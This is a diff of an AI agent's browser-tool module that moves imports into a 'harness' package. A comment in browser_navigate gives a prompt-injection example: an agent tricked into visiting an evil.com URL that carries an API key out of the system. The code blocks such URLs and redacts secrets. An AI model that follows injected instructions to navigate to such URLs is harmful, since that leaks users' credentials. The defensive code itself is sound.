@@ -37,7 +37,7 @@ Environment Variables:
   beyond project default. Common values: 600000 (10min), 1800000 (30min) (default: none)
 
 Usage:
-    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click
+    from harness.tools.browser_tool import browser_navigate, browser_snapshot, browser_click
     
     # Navigate to a page
     result = browser_navigate("https://example.com", task_id="task_123")
@@ -65,29 +65,29 @@ import time
 import requests
 from typing import Dict, Any, Optional, List
 from pathlib import Path
-from agent.auxiliary_client import call_llm
-from plutus_constants import get_hermes_home
+from harness.agent.auxiliary_client import call_llm
+from harness.constants import get_hermes_home
 
 try:
-    from tools.website_policy import check_website_access
+    from harness.tools.website_policy import check_website_access
 except Exception:
     check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
 
 try:
-    from tools.url_safety import is_safe_url as _is_safe_url
+    from harness.tools.url_safety import is_safe_url as _is_safe_url
 except Exception:
     _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
-from tools.browser_providers.base import CloudBrowserProvider
-from tools.browser_providers.browserbase import BrowserbaseProvider
-from tools.browser_providers.browser_use import BrowserUseProvider
-from tools.browser_providers.firecrawl import FirecrawlProvider
-from tools.tool_backend_helpers import normalize_browser_cloud_provider
+from harness.tools.browser_providers.base import CloudBrowserProvider
+from harness.tools.browser_providers.browserbase import BrowserbaseProvider
+from harness.tools.browser_providers.browser_use import BrowserUseProvider
+from harness.tools.browser_providers.firecrawl import FirecrawlProvider
+from harness.tools.tool_backend_helpers import normalize_browser_cloud_provider
 
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
 # camofox REST API instead of the agent-browser CLI.
 try:
-    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
+    from harness.tools.browser_camofox import is_camofox_mode as _is_camofox_mode
 except ImportError:
     _is_camofox_mode = lambda: False  # noqa: E731
 
@@ -189,7 +189,7 @@ def _get_command_timeout() -> int:
     _command_timeout_resolved = True
     result = DEFAULT_COMMAND_TIMEOUT
     try:
-        from plutus_cli.config import read_raw_config
+        from harness.cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg.get("browser", {}).get("command_timeout")
         if val is not None:
@@ -275,7 +275,7 @@ def _get_cdp_override() -> str:
         return _resolve_cdp_override(env_override)
 
     try:
-        from plutus_cli.config import read_raw_config
+        from harness.cli.config import read_raw_config
 
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
@@ -319,7 +319,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
     _cloud_provider_resolved = True
     try:
-        from plutus_cli.config import read_raw_config
+        from harness.cli.config import read_raw_config
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
         provider_key = None
@@ -349,7 +349,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     return _cached_cloud_provider
 
 
-from plutus_constants import is_termux as _is_termux_environment
+from harness.constants import is_termux as _is_termux_environment
 
 
 def _browser_install_hint() -> str:
@@ -402,7 +402,7 @@ def _allow_private_urls() -> bool:
     _allow_private_urls_resolved = True
     _cached_allow_private_urls = False  # safe default
     try:
-        from plutus_cli.config import read_raw_config
+        from harness.cli.config import read_raw_config
         cfg = read_raw_config()
         _cached_allow_private_urls = bool(cfg.get("browser", {}).get("allow_private_urls"))
     except Exception as e:
@@ -1046,7 +1046,7 @@ def _find_agent_browser() -> str:
             return which_result
 
     # Check local node_modules/.bin/ (npm install in repo root)
-    repo_root = Path(__file__).parent.parent
+    repo_root = Path(__file__).parent.parent.parent
     local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
     if local_bin.exists():
         _cached_agent_browser = str(local_bin)
@@ -1128,7 +1128,7 @@ def _run_browser_command(
         logger.warning("browser command blocked on Termux: %s", error)
         return {"success": False, "error": error}
     
-    from tools.interrupt import is_interrupted
+    from harness.tools.interrupt import is_interrupted
     if is_interrupted():
         return {"success": False, "error": "Interrupted"}
 
@@ -1338,7 +1338,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from agent.redact import redact_sensitive_text
+    from harness.agent.redact import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -1410,7 +1410,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from agent.redact import _PREFIX_RE
+    from harness.agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -1441,7 +1441,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_navigate
+        from harness.tools.browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
 
     effective_task_id = task_id or "default"
@@ -1550,7 +1550,7 @@ def browser_snapshot(
         JSON string with page snapshot
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_snapshot
+        from harness.tools.browser_camofox import camofox_snapshot
         return camofox_snapshot(full, task_id, user_task)
 
     effective_task_id = task_id or "default"
@@ -1599,7 +1599,7 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
         JSON string with click result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_click
+        from harness.tools.browser_camofox import camofox_click
         return camofox_click(ref, task_id)
 
     effective_task_id = task_id or "default"
@@ -1635,7 +1635,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         JSON string with type result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_type
+        from harness.tools.browser_camofox import camofox_type
         return camofox_type(ref, text, task_id)
 
     effective_task_id = task_id or "default"
@@ -1684,7 +1684,7 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     _SCROLL_PIXELS = 500
 
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_scroll
+        from harness.tools.browser_camofox import camofox_scroll
         # Camofox REST API doesn't support pixel args; use repeated calls
         _SCROLL_REPEATS = 5
         result = None
@@ -1718,7 +1718,7 @@ def browser_back(task_id: Optional[str] = None) -> str:
         JSON string with navigation result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_back
+        from harness.tools.browser_camofox import camofox_back
         return camofox_back(task_id)
 
     effective_task_id = task_id or "default"
@@ -1749,7 +1749,7 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
         JSON string with key press result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_press
+        from harness.tools.browser_camofox import camofox_press
         return camofox_press(key, task_id)
 
     effective_task_id = task_id or "default"
@@ -1791,7 +1791,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
     # --- Console output mode (original behaviour) ---
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_console
+        from harness.tools.browser_camofox import camofox_console
         return camofox_console(clear, task_id)
 
     effective_task_id = task_id or "default"
@@ -1870,7 +1870,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    from tools.browser_camofox import _ensure_tab, _post
+    from harness.tools.browser_camofox import _ensure_tab, _post
     try:
         tab_info = _ensure_tab(task_id or "default")
         tab_id = tab_info.get("tab_id") or tab_info.get("id")
@@ -1908,7 +1908,7 @@ def _maybe_start_recording(task_id: str):
         if task_id in _recording_sessions:
             return
     try:
-        from plutus_cli.config import read_raw_config
+        from harness.cli.config import read_raw_config
         hermes_home = get_hermes_home()
         cfg = read_raw_config()
         record_enabled = cfg.get("browser", {}).get("record_sessions", False)
@@ -1962,7 +1962,7 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         JSON string with list of images (src and alt)
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_get_images
+        from harness.tools.browser_camofox import camofox_get_images
         return camofox_get_images(task_id)
 
     effective_task_id = task_id or "default"
@@ -2030,7 +2030,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         JSON string with vision analysis results and screenshot_path
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_vision
+        from harness.tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
     import base64
@@ -2038,7 +2038,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     effective_task_id = task_id or "default"
     
     # Save screenshot to persistent location so it can be shared with users
-    from plutus_constants import get_hermes_dir
+    from harness.constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
     
@@ -2112,7 +2112,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         vision_timeout = 120.0
         vision_temperature = 0.1
         try:
-            from plutus_cli.config import load_config
+            from harness.cli.config import load_config
             _cfg = load_config()
             _vision_cfg = _cfg.get("auxiliary", {}).get("vision", {})
             _vt = _vision_cfg.get("timeout")
@@ -2145,7 +2145,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         try:
             response = call_llm(**call_kwargs)
         except Exception as _api_err:
-            from tools.vision_tools import (
+            from harness.tools.vision_tools import (
                 _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
             )
             if (_is_image_size_error(_api_err)
@@ -2165,7 +2165,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from agent.redact import redact_sensitive_text
+        from harness.agent.redact import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
@@ -2255,7 +2255,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     # The inactivity reaper still frees idle resources.
     if _is_camofox_mode():
         try:
-            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
+            from harness.tools.browser_camofox import camofox_close, camofox_soft_cleanup
             if not camofox_soft_cleanup(task_id):
                 camofox_close(task_id)
         except Exception as e:
@@ -2426,7 +2426,7 @@ if __name__ == "__main__":
 # ---------------------------------------------------------------------------
 # Registry
 # ---------------------------------------------------------------------------
-from tools.registry import registry, tool_error
+from harness.tools.registry import registry, tool_error
 
 _BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}
 
